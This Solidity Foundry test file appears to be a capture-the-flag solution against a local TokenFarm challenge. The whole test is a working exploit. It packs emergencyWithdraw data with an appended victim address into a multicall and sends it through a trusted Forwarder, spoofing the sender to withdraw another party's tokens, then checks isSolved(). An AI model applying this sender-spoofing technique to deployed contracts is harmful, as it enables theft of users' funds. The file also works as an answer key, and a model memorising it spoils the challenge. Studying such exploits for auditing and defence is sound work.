// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {TokenFarm, rewardToken, baseToken, Forwarder} from "../src/Farm.sol";
import {Deployer} from "../src/Deployer.sol";

contract EXP {
    Deployer deployer;

    function setUp() public {
        deployer = new Deployer();
    }

    function test_EXP() public {
        baseToken(deployer.get_Token0()).airdrop();
        baseToken(deployer.get_Token0()).approve(
            deployer.get_farm(),
            type(uint256).max
        );
        TokenFarm(deployer.get_farm()).deposit(1e9);
        // console2.log(
        //     "reward: ",
        //     TokenFarm(deployer.get_farm()).getPendingAmountByOwner(
        //         address(deployer)
        //     )
        // );
        // console2.log(
        //     "bal: ",
        //     TokenFarm(deployer.get_farm()).getAmountByOwner(address(deployer))
        // );
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodePacked(
            abi.encodeWithSignature(
                "emergencyWithdraw(address)",
                address(this)
            ),
            address(deployer)
        );
        Forwarder.ForwardRequest memory myReq = Forwarder.ForwardRequest(
            deployer.get_farm(),
            0,
            70000,
            abi.encodePacked(
                abi.encodeWithSignature("multicall(bytes[])", data)
            )
        );
        // TokenFarm(deployer.get_farm()).emergencyWithdraw(address(this));
        Forwarder(deployer.get_forwarder()).execute(myReq);
        console2.log(TokenFarm(deployer.get_farm()).isSolved());
    }
}
